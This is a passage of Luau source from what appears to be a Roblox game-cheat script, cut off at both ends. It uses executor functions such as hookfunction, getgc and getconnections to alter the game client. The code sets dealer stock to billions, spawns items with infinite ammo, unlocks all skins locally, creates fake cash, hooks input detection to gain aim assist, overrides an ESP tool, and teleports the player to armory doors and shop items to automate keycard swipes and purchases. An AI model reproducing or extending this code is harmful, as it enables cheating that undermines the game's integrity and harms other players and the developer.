							SetAttribute(LocalPlayer, "mobileDealer", true)

							for _, v27 in require(ReplicatedStorage.devv.shared.Indicies.mobileDealer), nil, nil do
								for _, v28 in v27, nil, nil do
									v28.stock = 9e9
								end
							end

							Connect(GetPropertyChangedSignal(LocalPlayer.PlayerGui.Backpack, "Enabled"), function()
								LocalPlayer.PlayerGui.Backpack.Holder.Locker.Visible = LocalPlayer.PlayerGui.Backpack.Enabled
							end)

							pcall(function()
								Connect(workspace.Sounds.Effects.ChildAdded, function(arg)
									local v27 = nil

									local function fn68(arg2)
										if arg2.Name == "grabPlayer" then
											arg2:Stop()
											arg:Destroy()
											pcall(Disconnect, v27)
										end
									end

									v27 = Connect
									v27 = v27(arg.ChildAdded, fn68)
								end)
							end)

							do
								local load = require(ReplicatedStorage.devv).load
								require(ReplicatedStorage.devv.client.Handlers.GrabHandler)
								local function fn68()trig= load ("trig");GUID= load ("GUID");Maid= load ("Maid");state= load ("state");skins= load ("skins");v3sfx= load ("v3sfx");v3item= load ("v3item");Signal= load ("Signal");v3items= load ("v3items");rewards= load ("rewards");v3sound= load ("v3sound");OhioRaycast= load ("Raycast");v3effect= load ("v3effect");makeToast= load ("makeToast");GUILoader= load ("GUILoader");dialogQueue= load ("dialogQueue");InputHandler= load ("InputHandler");specialRoles= load ("specialRoles");ClientEaster= load ("ClientEaster");ClientRagdoll= load ("ClientRagdoll");LimitedEvents= load ("LimitedEvents");RetrieveModel= load ("RetrieveModel");ClientReplicator= load ("ClientReplicator");nearbyPlayerUtil= load ("nearbyPlayerUtil");tutorialPulseEffect= load ("tutorialPulseEffect");CameraShaker=require(ReplicatedStorage.devv.vendor.CameraShaker);status=require(ReplicatedStorage.devv.client.Helpers.character.status);ClientEconomy=require(ReplicatedStorage.devv.client.Handlers.ClientEconomy);StickyHandler=require(ReplicatedStorage.devv.client.Handlers.StickyHandler);HitmarkerHandler=require(ReplicatedStorage.devv.client.Handlers.HitmarkerHandler);combatIndicator=require(ReplicatedStorage.devv.client.Helpers.ui.combatIndicator);DamageIndicator=require(ReplicatedStorage.devv.client.Helpers.ui.DamageIndicator);Houses=require(ReplicatedStorage.devv.client.Handlers.ClientHouse.PlotTypes.Houses);ClientHouseFurniture=require(ReplicatedStorage.devv.client.Handlers.ClientHouse.Furniture);FurnitureDefs=require(ReplicatedStorage.devv.shared.Indicies.furniture);ClientDestruction=require(ReplicatedStorage.devv.client.Handlers.ClientDestruction);itemButton=require(ReplicatedStorage.devv.client.Objects.v3item.modules.inventory.itemButton);updateMoney=require(ReplicatedStorage.devv.client.Handlers.PlayerDataHandler.updateFuncs.money);meleeHitreg=require(ReplicatedStorage.devv.client.Objects.v3item.modules.melee).meleeHitreg;zoneUtils=require(ReplicatedStorage.devv.client.Helpers.hitreg.zoneUtils);inventory=v3item.inventory;FireServer=Signal.FireServer;LinkSignal=Signal.LinkSignal;InvokeServer=Signal.InvokeServer;end
								fn68()
							end

							if setthreadidentity then
								pcall(setthreadidentity, oldTI or 8)
							end

							do
								local str3 = "Aim Assist Sens"
								local n4 = 0
								local n5 = 1
								local v27 = NewRGB(74, 202, 86)
								local v28 = NewRGB(175, 175, 175)
								local n6 = 75

								local function fn68(arg)
									for i = 1, #arg do
										local v29 = arg[i]
										if v29.displayName == str3 then
											return i, v29
										end
									end

									return nil, nil
								end

								local function fn69(arg)
									local v29 = FindFirstChild(arg, "Sorts")
									if not v29 then
										return "Game"
									end
									local v30 = GetChildren(v29)

									for i = 1, #v30 do
										local v31 = v30[i]
										if IsA(v31, "GuiObject") and v31.BackgroundTransparency < 0.9 then
											return v31.Name
										end
									end

									return "Game"
								end

								local function fn70(arg)
									local v29 = GetChildren(arg)
									local n7 = 0
									local n8 = 0

									for i = 1, #v29 do
										local v30 = v29[i]

										if IsA(v30, "GuiObject") and v30.Visible then
											n7 += 1
											n8 += n6
										end
									end

									arg.CanvasSize = UDim2.fromOffset(0, n8 + n6 + Max(0, n7 - 1))
								end

								local function fn71(arg, arg2)
									local function fn72(arg3)
										local v29 = Clamp(math.round(((tonumber(arg2.defaultValue) or 0) + (arg3 or 0) * 0.1) * 10) / 10, 0, 1)

										if v29 == 0 then
											SetAttribute(LocalPlayer, "aimAssistSensitivity", 0)
										else
											arg2.onUpdate(nil, v29)
										end

										arg.Buttons.NumLabel.Text = tostring(v29)
										arg.Buttons.Add.BackgroundColor3 = v29 >= n5 and v28 or v27
										arg.Buttons.Subtract.BackgroundColor3 = v29 <= n4 and v28 or v27
										arg2.defaultValue = v29
										FireServer("updateSetting", arg2.displayName, v29)
										return v29
									end

									fn72()

									Connect(arg.Buttons.Add.Activated, function()
										fn72(1)
									end)

									Connect(arg.Buttons.Subtract.Activated, function()
										fn72(-1)
									end)
								end

								local function fn72(arg, arg2, arg3)
									if GetAttribute(arg2, "OhioBound") then
										return
									end
									local v29 = GetChildren(arg)

									for i = 1, #v29 do
										local v30 = v29[i]

										if v30 ~= arg2 and v30.Name == str3 then
											v30:Destroy()
										end
									end

									Wait()

									if typeof(getconnections) == "function" then
										local tbl10 = { arg2.Buttons.Add, arg2.Buttons.Subtract }

										for i = 1, #tbl10 do
											local v30 = GetConnections(tbl10[i].Activated)

											for i2 = 1, #v30 do
												pcall(Disconnect, v30[i2])
											end
										end
									end

									fn71(arg2, arg3)
									SetAttribute(arg2, "OhioBound", true)

									if arg2.Visible then
										fn70(arg)
									end
								end

								local function fn73(layoutOrder, arg)
									local v29 = FindFirstChild(LocalPlayer, "PlayerGui")
									if not v29 then
										return false
									end
									local v30 = FindFirstChild(v29, "Phone")
									if not v30 then
										return false
									end
									local v31 = FindFirstChild(v30, "Holder")
									v31 = v31 and FindFirstChild(v31, "ScreenContainer")
									v31 = v31 and FindFirstChild(v31, "SettingsApp")
									local v32 = v31 and FindFirstChild(v31, "SettingsContainer")
									if not v32 then
										return false
									end

									if not GetAttribute(v32, "OhioWatched") then
										SetAttribute(v32, "OhioWatched", true)

										Connect(v32.ChildAdded, function(arg2)
											if arg2.Name == str3 then
												fn72(v32, arg2, arg)
											end
										end)
									end

									local clone = FindFirstChild(v32, "Aim Assist Sens")
									if GetAttribute(v32, "OhioWatched") and clone and GetAttribute(clone, "OhioBound") then
										return true
									end

									if not clone then
										if not (#GetChildren(v32) > 1) then
											return false
										end
										clone = ReplicatedStorage.Guis.Frames.SettingTicker:Clone()
										clone.Name = arg.displayName
										clone.LayoutOrder = layoutOrder
										clone.NameLabel.Text = arg.displayName
										SetAttribute(clone, "Id", layoutOrder)
										clone.Parent = v32
										clone.Visible = arg.sort == fn69(v31)
									end

									SetAttribute(clone, "Id", layoutOrder)
									clone.LayoutOrder = layoutOrder
									fn72(v32, clone, arg)
									return true
								end

								Spawn(function()
									local settingsData = require(ReplicatedStorage.devv.client.Objects.v3item.bin.Phone.modules.controller.modules.phone.screens.SettingsApp.settingsData)
									local v29, v30 = fn68(settingsData)
									if not v30 then
										return
									end
									v30.device = nil
									local getStat = nil

									pcall(function()
										getStat = InvokeServer("getStat", "settings")
									end)

									local v31 = GetAttribute(LocalPlayer, "aimAssistSensitivity")

									if type(getStat) == "table" and getStat[str3] ~= nil then
										v31 = getStat[str3]
									end

									local defaultValue = tonumber(v31) or v30.defaultValue or 1
									v30.onUpdate(nil, defaultValue)
									v30.defaultValue = Clamp(defaultValue, 0, 1)

									Spawn(function()
										while true do
											fn73(v29, v30)
											Wait(0.25)
										end
									end)
								end)
							end

							local v27 = nil

							v27 = hookfunction(InputHandler.GetInputType, function(...)
								local v28 = debug.traceback()
								if v28:find("Gun") and v28:find("controller") then
									return "Touch"
								end
								return v27(...)
							end)

							local tbl10
							tbl10 = { "Heavy Vest", "Medium Vest", "Light Vest" }
							local new
							new = CameraShaker.new
							local tbl11
							tbl11 = {}
							local tbl12
							tbl12 = {}
							local tbl13
							tbl13 = {}
							local tbl14
							tbl14 = {}
							local tbl15
							tbl15 = {}
							local tbl16
							tbl16 = {}
							local tbl17
							tbl17 = {}
							local tbl18
							tbl18 = {}
							local tbl19
							tbl19 = {}
							local tbl20
							tbl20 = {}
							local tbl21
							tbl21 = {}
							local tbl22
							tbl22 = {}
							local tbl23
							tbl23 = {}
							local tbl24
							tbl24 = {}
							local tbl25
							tbl25 = {}
							local flag
							flag = false
							local flag2
							flag2 = false
							local tbl26
							tbl26 = { BalloonTarget = nil, Kunai = false, CandyCane = false, Scythe = false }

							do
								local n4 = 8
								local function fn68(...) end

								local function fn69(arg, arg2)
									for _, v28 in pairs(arg) do
										if typeof(v28) == "Instance" and IsA(v28, "ModuleScript") then
											pcall(require, v28)
											arg2.n = arg2.n + 1

											if n4 <= arg2.n then
												arg2.n = 0
												Wait()
											end
										end
									end
								end

								local function fn70()
									Spawn(function()
										local tbl27 = { n = 0 }
										fn69(tbl14, tbl27)
										fn69(tbl16, tbl27)
										fn69(tbl18, tbl27)
										fn69(tbl20, tbl27)
									end)
								end

								fn68()
								Sort(tbl15)
								Sort(tbl17)
								Sort(tbl19)
								Sort(tbl21)
								fn70()
							end

							local function fn68()local H=GetChildren(ReplicatedStorage.devv.shared.Indicies.v3effects.bin);for m=1,#H,1 do local h=H[m]; tbl12 [h.Name]={};Insert( tbl13 ,h.Name);m=GetChildren(h);for H=1,#m,1 do local B=m[H];if IsA(B,"ModuleScript")then Insert( tbl12 [h.Name],B.Name);end;end;end;end
							fn68()
							Sort(tbl13)
							local fn69
							fn69 = function(D)D=D or LocalPlayer;return D and D.Character;end
							local fn70
							fn70 = function(H)local m= fn69 (H);return m and(FindFirstChildOfClass(m,"Humanoid"));end
							local fn71
							fn71 = function(H)local m= fn69 (H);return m and(FindFirstChild(m,"HumanoidRootPart"));end
							local fn72
							fn72 = function(D,H)for m,m in pairs(inventory.items or{})do if m and(m.name==D or m.guid==D or m.type==D or m.subtype==D)then if H and m.isStashed then continue;end;return m;end;end;end
							local fn73
							fn73 = function(H)return  fn72 (H)~=nil;end
							local fn74

							fn74 = function(arg)
								return v3item.GetEquipped(arg or LocalPlayer)
							end

							local function fn75(arg, arg2)
								if not arg2 and typeof(arg) == "Instance" then
									if IsA(arg, "Player") then
										arg2 = arg
									else
										arg2 = Players:GetPlayerFromCharacter(arg)
									end
								end

								if not arg2 then
									return ""
								end
								local v28 = v3item.GetEquipped(arg2)

								if type(v28) == "table" then
									local name2 = v28.name or v28.Name
									if type(name2) == "string" then
										return name2
									end
									return ""
								end

								if type(v28) == "string" then
									return v28
								end
								return ""
							end

							if RobloxESP and typeof(RobloxESP.Override) == "function" then
								RobloxESP:Override({ GetTool = fn75 })
							end

							local fn76

							fn76 = function(arg)
								if arg then
									pcall(inventory.setEquipped, arg)
								end
							end

							local fn77, fn78, fn79, flag3, fn80, fn81, fn82, fn83, fn84, fn85
							local fn86, fn87, fn88, fn89

							do
								local function fn90()
									pcall(inventory.unequipAll)
								end

								fn77 = function(arg)
									local v28 = fn72(arg)
									if not arg or not v28 or v28.isStashed then
										return
									end
									FireServer("removeItem", arg)
								end

								local function fn91(arg)
									return (arg - NewVector3(393.817017, 15.3763409, -1385.31653)).Magnitude < 200
								end

								local function fn92(arg)
									return (arg - NewVector3(601.762817, 29.3132324, -909.026794)).Magnitude < 200
								end

								fn78 = function(arg)
									if not arg or not IsA(arg, "BasePart") then
										return
									end
									arg.AssemblyLinearVelocity = EmptyVector3
									arg.AssemblyAngularVelocity = EmptyVector3
								end

								fn79 = function(arg, cFrame, arg2)
									local n4 = tick() + arg2

									while tick() < n4 do
										if not arg.Parent then
											return
										end
										arg.CFrame = cFrame
										fn78(arg)
										Wait(0.05)
									end
								end

								flag3 = nil

								fn80 = function(cFrame, arg)
									if typeof(cFrame) ~= "CFrame" or not arg or arg <= 0 then
										return
									end
									local n4 = tick() + arg

									while true do
										if tick() < n4 and not flag3 then
											local v28 = fn71()

											if v28 then
												v28.CFrame = cFrame
												fn78(v28)
												RunService.Heartbeat:Wait()
												continue
											end
										end

										break
									end

									fn78(fn71())
								end

								local n4 = 2
								local n5 = 2
								local tbl27 = {}
								local tbl28 = {}

								local function fn93(arg)
									local v28 = tbl27[arg]
									if v28 and v28.Parent then
										return v28
									end
									local v29 = FindFirstChild(workspace, "Game")
									local v30 = v29 and FindFirstChild(v29, "Props")
									local v31 = v30 and FindFirstChild(v30, "Door")
									if not v31 then
										return nil
									end
									local v32 = GetChildren(v31)

									for i = 1, #v32 do
										local v33 = v32[i]
										if GetAttribute(v33, "keycardName") == arg then
											tbl27[arg] = v33
											return v33
										end
									end

									return nil
								end

								local function fn94(arg, arg2, arg3)
									local v28 = fn71()
									if not arg2 or not v28 then
										return false
									end
									local v29 = fn93(arg)
									if v29 and GetAttribute(v29, "isOpen") then
										return true
									end
									local v30 = tbl28[arg]
									if v30 and tick() - v30 < n5 then
										return true
									end
									fn76(arg2.guid)
									fn79(v28, arg3, 0.5)
									local n6 = tick() + n4
									local n7 = 0
									local flag4

									while true do
										flag4 = false

										if not (tick() < n6) then
											break
										else
											n7 += 1

											if InvokeServer("customAction", arg2.guid, "swipe") then
												flag4 = true
												break
											elseif v29 and GetAttribute(v29, "isOpen") then
												flag4 = true
												break
											else
												fn79(v28, arg3, 0.5)
											end
										end
									end

									if flag4 then
										tbl28[arg] = tick()
										fn79(v28, arg3, 0.3)
									end

									print(Format("[OhioAutoFarm][Armory] %s opened=%s attempts=%d", arg, tostring(flag4), n7))
									return flag4
								end

								local function fn95()
									local v28 = NewCFrame
									return fn94("militaryArmory", fn72("Military Armory Keycard", true), v28(393.817017, 15.3763409, -1385.31653))
								end

								local function fn96()
									local v28 = NewCFrame
									return fn94("policeArmory", fn72("Police Armory Keycard", true), v28(601.762817, 29.3132324, -909.026794))
								end

								fn81 = function(arg)
									if not arg then
										return false
									end
									local position = arg.Position
									if fn91(position) and not fn73("Military Armory Keycard", true) then
										return false
									end

									if fn92(position) and not fn73("Police Armory Keycard", true) then
										return false
									end
									return true
								end

								fn82 = function(arg)
									if not arg then
										return false
									end
									local position = arg.Position
									if fn91(position) then
										return fn95()
									end

									if fn92(position) then
										return fn96()
									end
									return true
								end

								ohioCloneValue = function(arg, arg2)
									if type(arg) ~= "table" then
										return arg
									end
									arg2 = arg2 or {}
									if arg2[arg] then
										return arg2[arg]
									end
									local tbl29 = {}
									arg2[arg] = tbl29

									for k, v28 in pairs(arg) do
										tbl29[ohioCloneValue(k, arg2)] = ohioCloneValue(v28, arg2)
									end

									return tbl29
								end

								local function fn97(arg)
									local tbl29 = {}

									if typeof(arg) == "string" then
										if arg ~= "None" and arg ~= "" then
											tbl29[arg] = true
										end

										return tbl29
									end

									local v28 = pairs
									arg = arg or {}

									for k, v29 in v28(arg) do
										if not (typeof(v29) == "boolean" and v29 == true) then
											if typeof(v29) ~= "table" then
												k = v29
											else
												k = v29.Value or v29.Title or v29.Name or v29.Text
											end
										end

										if typeof(k) == "string" and k ~= "None" and k ~= "" then
											tbl29[k] = true
										end
									end

									return tbl29
								end

								fn83 = function(arg)
									local tbl29 = {}

									for k in pairs(fn97(arg)) do
										Insert(tbl29, k)
									end

									Sort(tbl29)
									return tbl29
								end

								local function fn98(arg)
									if not arg then
										return false
									end
									local flag4 = tbl11[arg] ~= nil
									tbl11[arg] = nil
									pcall(inventory.remove, arg)
									local currentItemsData = inventory.currentItemsData or {}

									for i = #currentItemsData, 1, -1 do
										local v28 = inventory.currentItemsData[i]

										if v28 and v28.guid == arg then
											Remove(inventory.currentItemsData, i)
											flag4 = true
										end
									end

									local v28 = fn74()

									if v28 and v28.guid == arg then
										pcall(inventory.setEquipped, nil)
									end

									if flag4 then
										inventory.update(inventory.currentItemsData)
									end

									return flag4
								end

								local function fn99(arg, arg2)
									if not arg then
										return false
									end
									local name2 = nil

									if arg2 then
										local ok4, result4 = pcall(require, arg2)

										if ok4 and type(result4) == "table" then
											name2 = result4.name
										end
									end

									local function fn100(arg3)
										if arg3 then
											arg3 = arg3.name == arg or arg3.name == name2 or arg3._moonSelectionName == arg
										end

										return arg3
									end

									local tbl29 = {}

									for k, v28 in pairs(tbl11) do
										if fn100(v28) then
											Insert(tbl29, k)
										end
									end

									local flag4 = false

									for i = 1, #tbl29 do
										flag4 = fn98(tbl29[i]) or flag4
									end

									local v28 = pairs
									local items = inventory.items or {}

									for k, item in v28(items) do
										if fn100(item) and (tbl11[k] or item._moonClientItem) then
											flag4 = fn98(k) or flag4
										end
									end

									local currentItemsData = inventory.currentItemsData or {}

									for i = #currentItemsData, 1, -1 do
										local v29 = inventory.currentItemsData[i]
										local guid = v29 and v29.guid

										if fn100(v29) and (not guid or tbl11[guid] or v29._moonClientItem) then
											if guid then
												tbl11[guid] = nil
												pcall(inventory.remove, guid)
											end

											Remove(inventory.currentItemsData, i)
											flag4 = true
										end
									end

									if flag4 then
										inventory.update(inventory.currentItemsData)
									end

									return flag4
								end

								fn84 = function(arg, arg2)
									local v28 = fn97(arg2)
									local v29 = pairs
									arg = arg or {}
									local flag4 = false

									for k, v30 in v29(arg) do
										if not v28[k] then
											flag4 = fn99(k, v30) or flag4
										end
									end

									if flag4 then
										inventory.update(inventory.currentItemsData)
									end
								end

								local function fn100(arg, arg2)
									return arg ~= nil and (arg._moonSelectionName == arg2 or arg.name == arg2)
								end

								local function fn101(arg)
									if type(arg) ~= "string" or arg == "" then
										return nil
									end

									for _, v28 in pairs(tbl11) do
										if fn100(v28, arg) then
											return v28
										end
									end

									return nil
								end

								local function fn102(arg)
									if not (arg and arg.guid) then
										return
									end

									if not (inventory.items and inventory.items[arg.guid]) then
										inventory.add(arg, false, nil)
									end

									local currentItemsData = inventory.currentItemsData
									if type(currentItemsData) ~= "table" then
										return
									end

									for i = 1, #currentItemsData do
										local v28 = currentItemsData[i]
										if v28 and v28.guid == arg.guid then
											inventory.update(currentItemsData)
											return
										end
									end

									Insert(currentItemsData, arg)
									inventory.update(currentItemsData)
								end

								fn85 = function(arg)
									Sort(arg, function(arg2, arg3)
										return arg2.index < arg3.index
									end)

									local tbl29 = {}
									local tbl30 = {}

									for i = 1, #arg do
										local v28 = arg[i]
										local item = v28.item
										local guid = item and item.guid

										if item then
											item = item._moonSelectionName or item.name
										end

										if guid and type(item) == "string" and item ~= "" and tbl29[item] then
											tbl11[guid] = nil
										else
											if type(item) == "string" and item ~= "" then
												tbl29[item] = true
											end

											Insert(tbl30, v28)
										end
									end

									return tbl30
								end

								local function fn103(arg, moonSelectionName)
									if type(moonSelectionName) ~= "string" or moonSelectionName == "" or moonSelectionName == "None" then
										return
									end

									if fn72(moonSelectionName) then
										return
									end
									local v28 = fn101(moonSelectionName)
									if v28 then
										fn102(v28)
										return
									end
									arg = arg and arg[moonSelectionName]
									if not arg then
										return
									end
									local ok4, result4 = pcall(require, arg)
									if not ok4 or type(result4) ~= "table" then
										return
									end
									local v29 = ohioCloneValue(result4)
									v29.guid = GUID()
									v29._moonClientItem = true
									v29._moonSelectionName = moonSelectionName

									if v29.ammo then
										v29.ammo = math.huge
									end

									tbl11[v29.guid] = v29
									inventory.add(v29, false, nil)
									Insert(inventory.currentItemsData, v29)
									inventory.update(inventory.currentItemsData)
								end

								fn86 = function()
									Spawn(function()
										while Wait(0.5) do
											for k in pairs(fn97(tbl22)) do
												fn103(tbl14, k)
											end

											for k in pairs(fn97(tbl23)) do
												fn103(tbl16, k)
											end

											for k in pairs(fn97(tbl24)) do
												fn103(tbl18, k)
											end
										end
									end)
								end

								fn87 = function(D)local H,m=pcall(ClientReplicator.Get,D,"knocked");local h,B=pcall(ClientReplicator.Get,D,"crawl");return H and m==true or h and B==true;end

								fn88 = function(arg)
									local v28 = fn71()
									if not v28 then
										return
									end
									local n6 = tonumber(arg) or 10000
									ClientEconomy.MakeLocalCash("fake cash", v28.CFrame, n6, n6, NewVector3(5, 10, 0))
								end

								fn89 = function()
									local Skins = require(ReplicatedStorage.devv.client.Helpers.ui.screens.CaseMenu.Skins)
									local skinUpdate = inventory.skinUpdate

									local function skinUpdate2(arg, arg2)
										local v28, v29, v30 = pairs(inventory.items or {})
										local flag4 = false
										local flag5 = true

										for _, v31 in v28, v29, v30 do
											if v31.name == arg then
												local flag6 = arg2 and v31.skin and v31.skin.name == arg2
												flag4 = true

												if not flag6 then
													flag5 = false
												end
											end
										end

										if flag4 and flag5 then
											return
										end
										local v31 = pairs
										local items = inventory.items or {}

										for _, item in v31(items) do
											if item.name == arg and item.skin then
												local skin = item.skin
												pcall(skin.Unequipped, skin)
												pcall(skin.Destroy, skin)

												if item.skin == skin then
													item.skin = nil
												end
											end
										end

										return skinUpdate(arg, arg2)
									end

									inventory.skinUpdate = skinUpdate2

									pcall(function()
										local v28 = hookfunction
										local attemptEquip = Skins.AttemptEquip

										local v29 = luraph_runtime1(function(arg, arg2, arg3)
											if arg:IsSkinEquipped(arg2, arg3) then
												arg3 = nil
											end

											state.data.equippedSkins[arg2] = arg3
											fn90()
											skinUpdate2(arg2, arg3)
											arg:_setEquipped(arg2, arg3)
											return true
										end)

										v28(attemptEquip, v29)
									end)

									local v28 = GetChildren(ReplicatedStorage.devv.shared.Indicies.skins.bin)

									for i = 1, #v28 do
										local v29 = GetChildren(v28[i])

										for i2 = 1, #v29 do
											local v30 = v29[i2]

											if IsA(v30, "ModuleScript") then
												local ok4, result4 = pcall(require, v30)

												if ok4 and result4 and type(result4.compatabilities) == "table" then
													for _, compatability in pairs(result4.compatabilities) do
														state.data.ownedSkins[compatability] = state.data.ownedSkins[compatability] or {}
														state.data.ownedSkins[compatability][v30.Name] = 1
													end
												end

												if ok4 and result4 and skins and skins.compatabilities and skins.compatabilities.Generic then
													local displayName = result4.displayName or v30.Name

													for _, v31 in pairs(skins.compatabilities.Generic) do
														state.data.ownedSkins[v31] = state.data.ownedSkins[v31] or {}
														state.data.ownedSkins[v31][displayName] = 1
													end
												end
											end
										end
									end
								end
							end

							local fn90

							do
								local Wallet = fn72("Wallet")

								local tbl27 = {
									name = Wallet and Wallet.name or "Wallet",
									modelName = Wallet and Wallet.modelName or "Wallet",
									subtype = Wallet and Wallet.subtype or "Wallet",
								}

								tbl27.TPSOffsets = Wallet and ohioCloneValue(Wallet.TPSOffsets)
								tbl27.viewportOffsets = Wallet and ohioCloneValue(Wallet.viewportOffsets)

								local function fn91(arg)
									local v28 = tbl20[arg]

									if typeof(v28) == "Instance" then
										local ok4, result4 = pcall(require, v28)
										if ok4 and type(result4) == "table" then
											return result4
										end
										return nil
									end

									if type(v28) == "table" then
										return v28
									end
									return nil
								end

								fn90 = function(name2)
									local Wallet2 = fn72("Wallet")
									if not Wallet2 then
										return
									end
									local v28 = fn91(name2)
									local flag4 = name2 == "None" or not v28

									for _, v29 in pairs(getgc(true)) do
										if type(v29) == "table" and rawget(v29, "name") == "Wallet" then
											if flag4 then
												v29.name = tbl27.name
												v29.modelName = tbl27.modelName
												v29.subtype = tbl27.subtype
											else
												v29.name = name2
												v29.modelName = name2
												v29.subtype = "Wallet"

												if v29.TPSOffsets and v28.TPSOffsets then
													v29.TPSOffsets.hold = v28.TPSOffsets.hold
												end

												if v29.viewportOffsets and v29.viewportOffsets.hotbar and v28.hotbar then
													v29.viewportOffsets.hotbar.offset = v28.hotbar.offset
													v29.viewportOffsets.hotbar.rotoffset = v28.hotbar.rotoffset
												end
											end

											break
										end
									end

									if flag4 then
										Wallet2.name = tbl27.name
										Wallet2.modelName = tbl27.modelName
										Wallet2.subtype = tbl27.subtype

										if tbl27.TPSOffsets then
											Wallet2.TPSOffsets = ohioCloneValue(tbl27.TPSOffsets)
										end

										if tbl27.viewportOffsets then
											Wallet2.viewportOffsets = ohioCloneValue(tbl27.viewportOffsets)
										end
									else
										Wallet2.name = name2
										Wallet2.modelName = name2
										Wallet2.subtype = "Wallet"

										if Wallet2.TPSOffsets and v28.TPSOffsets then
											Wallet2.TPSOffsets.hold = v28.TPSOffsets.hold
										end

										if Wallet2.viewportOffsets and Wallet2.viewportOffsets.hotbar and v28.hotbar then
											Wallet2.viewportOffsets.hotbar.offset = v28.hotbar.offset
											Wallet2.viewportOffsets.hotbar.rotoffset = v28.hotbar.rotoffset
										end
									end

									if Wallet2.button and Wallet2.button.resetModelSkin then
										Wallet2.button:resetModelSkin()
									end

									if Wallet2.backpackButton and Wallet2.backpackButton.resetModelSkin then
										Wallet2.backpackButton:resetModelSkin()
									end
								end
							end

							local Balloon = require(ReplicatedStorage.devv.shared.Indicies.v3items.bin.Holdable.Balloon)
							ohioCloneValue(Balloon)
							local Balloon2 = fn72("Balloon")

							if Balloon2 then
								local tbl27 = {
									name = Balloon2.name,
									modelName = Balloon2.modelName,
									subtype = Balloon2.subtype,
									holdableType = Balloon2.holdableType,
									multiplier = Balloon2.multiplier,
									movespeedAdd = Balloon2.movespeedAdd,
									TPSOffsets = ohioCloneValue(Balloon2.TPSOffsets),
									viewportOffsets = ohioCloneValue(Balloon2.viewportOffsets),
								}
							end

							local fn91, fn92

							do
								local str3 = "balloon"
								local str4 = "kunai"
								local str5 = "candy"
								local str6 = "scythe"
								local str7 = "Kunai"
								local str8 = "Candy Cane"
								local str9 = "Scythe"

								local tbl27 = {
									"name",
									"modelName",
									"holdableType",
									"itemFuncName",
									"TPSOffsets",
									"viewportOffsets",
									"FPSOffsets",
									"itemAnimOffsets",
									"slashAnimName",
									"stabAnimName",
								}

								local function fn93(arg)
									if type(arg) ~= "string" or arg == "" then
										return nil
									end
									local ok4, result4 = pcall(v3items.getItemData, arg)
									if ok4 and type(result4) == "table" then
										return result4
									end
									return nil
								end

								local function fn94(arg)
									local tbl28 = {}

									for i = 1, #tbl27 do
										local v28 = tbl27[i]
										tbl28[v28] = ohioCloneValue(arg[v28])
									end

									return tbl28
								end

								local function fn95(arg, arg2, arg3)
									if not (arg and arg2) then
										return
									end

									for i = 1, #tbl27 do
										local v28 = tbl27[i]
										local v29 = arg2[v28]

										if v29 ~= nil then
											arg[v28] = ohioCloneValue(v29)
										elseif arg3 then
											arg[v28] = nil
										end
									end
								end

								local function fn96(arg, arg2)
									local v28 = tbl11[arg]

									if v28 then
										fn95(v28, arg2, true)
									end

									local currentItemsData = inventory.currentItemsData or {}

									for i = 1, #currentItemsData do
										local v29 = currentItemsData[i]
										if v29 and v29.guid == arg then
											v29.name = arg2.name
											break
										end
									end
								end

								local function fn97(arg)
									if not arg then
										return
									end
									local flag4 = arg.equipped == true

									if arg.model then
										pcall(function()
											arg.model:Destroy()
										end)

										arg.model = nil
									end

									if arg.button and arg.button.resetModelSkin then
										pcall(function()
											arg.button:resetModelSkin()
										end)
									end

									if arg.backpackButton and arg.backpackButton.resetModelSkin then
										pcall(function()
											arg.backpackButton:resetModelSkin()
										end)
									end

									if flag4 and arg.SetEquipped then
										pcall(function()
											arg:SetEquipped(false)
											arg:SetEquipped(true)
										end)
									end
								end

								local function fn98(arg, arg2)
									return arg2 == "Balloon" or type(arg) == "string" and tbl16[arg] ~= nil
								end

								local function fn99(arg, arg2)
									if not arg then
										return false
									end
									local guid = arg.guid and tbl25[arg.guid]
									guid = guid and guid.original
									local name2 = guid and guid.name or arg.name
									guid = guid and guid.holdableType or arg.holdableType
									if arg2 == str3 then
										return fn98(name2, guid)
									end

									if arg2 == str4 then
										return name2 == str7
									end

									if arg2 == str5 then
										return name2 == str8
									end

									if arg2 == str6 then
										return name2 == str9
									end
									return false
								end

								local function fn100(arg, recipeKey, targetName)
									if not (arg and arg.guid and targetName) then
										return false
									end
									local v28 = fn93(targetName)
									if not v28 then
										return false
									end
									local guid = arg.guid
									local tbl28 = tbl25[guid]

									if not tbl28 then
										tbl28 = { original = fn94(arg), recipeKey = recipeKey, targetName = targetName }
										tbl25[guid] = tbl28
									else
										tbl28.recipeKey = recipeKey
										tbl28.targetName = targetName
									end

									fn95(arg, tbl28.original, true)
									fn95(arg, v28, false)
									fn96(guid, arg)
									return true
								end

								local function fn101(arg, arg2)
									if not arg2 then
										return
									end
									local v28 = pairs
									local items = inventory.items or {}

									for _, item in v28(items) do
										if fn99(item, arg) then
											fn100(item, arg, arg2)
										end
									end
								end

								local function fn102()
									for k in pairs(tbl25) do
										local items = inventory.items and inventory.items[k]

										if items then
											fn97(items)
										end
									end
								end

								fn91 = function(arg, arg2)
									if flag2 or not flag then
										return
									end
									flag2 = true
									fn101("balloon", tbl26.BalloonTarget)

									if tbl26.Kunai then
										fn101("kunai", "Spirit Kunai")
									end

									if tbl26.CandyCane then
										fn101("candy", "Blue Candy Cane")
									end

									if tbl26.Scythe then
										fn101("scythe", "Spectral Scythe")
									end

									if arg2 then
										pcall(inventory.update, inventory.currentItemsData)
									end

									if arg then
										fn102()
									end

									flag2 = false
								end

								local function fn103(arg, arg2)
									if flag2 or next(tbl25) == nil then
										return
									end
									flag2 = true

									for k, v28 in pairs(tbl25) do
										local items = inventory.items and inventory.items[k]

										if items and v28 and v28.original then
											fn95(items, v28.original, true)
											fn96(k, items)
										end
									end

									if arg2 then
										pcall(inventory.update, inventory.currentItemsData)
									end

									if arg then
										fn102()
									end

									flag2 = false
								end

								fn92 = function(arg)
									flag = arg == true

									if flag then
										fn91(true, true)
									else
										fn103(true, true)
									end
								end
							end

							local fn93, fn94

							do
								local function fn95()
									if flag then
										fn91(true, false)
									end
								end

								pcall(function()
									Connect(inventory.onItemAdded, function()
										if flag then
											fn91(true, false)
										end
									end)
								end)

								local flag4 = false

								fn93 = function(arg, arg2)
									if flag4 or not arg then
										return
									end
									local v28 = FindFirstChild(workspace, "ItemsOnSale") and FindFirstChild(workspace.ItemsOnSale, arg)
									local v29 = fn71()
									if not v28 or not v28.PrimaryPart or not v29 then
										return
									end
									flag4 = true
									local cFrame = v29.CFrame
									local position = v28.PrimaryPart.Position

									for i = 1, 3 do
										v29.CFrame = NewCFrame(position)
										InvokeServer("attemptPurchase", arg, false)

										if arg2 then
